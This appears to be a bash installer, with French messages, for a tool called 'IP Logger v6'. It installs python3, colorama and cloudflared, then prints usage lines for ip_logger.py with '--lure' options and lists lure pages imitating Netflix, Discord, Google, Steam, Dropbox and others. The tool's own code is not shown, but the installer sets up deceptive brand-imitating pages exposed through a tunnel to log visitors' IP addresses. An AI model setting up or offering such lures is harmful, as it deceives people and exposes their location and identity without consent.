set -e

echo ""
echo " ========================================"
echo "  IP Logger v6  --  Installer (for Linux)"
echo " ========================================"
echo ""

if ! command -v python3 &>/dev/null; then
    echo " [!] python3 non trouvé. Installation..."
    sudo apt-get update -qq && sudo apt-get install -y python3 python3-pip
else
    echo " [OK] $(python3 --version) détecté"
fi

python3 -m pip install colorama --quiet 2>/dev/null || true
echo " [OK] colorama installé"

if ! command -v cloudflared &>/dev/null; then
    echo " [*] Installation de cloudflared..."
    ARCH=$(uname -m)
    if [ "$ARCH" = "x86_64" ]; then
        CF_BIN="cloudflared-linux-amd64"
    elif [ "$ARCH" = "aarch64" ]; then
        CF_BIN="cloudflared-linux-arm64"
    else
        CF_BIN="cloudflared-linux-amd64"
    fi
    curl -fsSL "https://github.com/cloudflare/cloudflared/releases/latest/download/${CF_BIN}" \
        -o /tmp/cloudflared
    chmod +x /tmp/cloudflared
    sudo mv /tmp/cloudflared /usr/local/bin/cloudflared
    echo " [OK] cloudflared installé dans /usr/local/bin/"
else
    echo " [OK] cloudflared détecté ($(cloudflared --version 2>&1 | head -1))"
fi

echo ""
echo " ========================================"
echo "  Installation terminée !"
echo " ========================================"
echo ""
echo " Usage :"
echo "   python3 ip_logger.py"
echo "   python3 ip_logger.py --lure netflix"
echo "   python3 ip_logger.py --lure discord --secret montoken"
echo "   python3 ip_logger.py --no-tunnel --lure captcha"
echo ""
echo " Pages : captcha google discord youtube twitch netflix steam dropbox 404"
echo ""
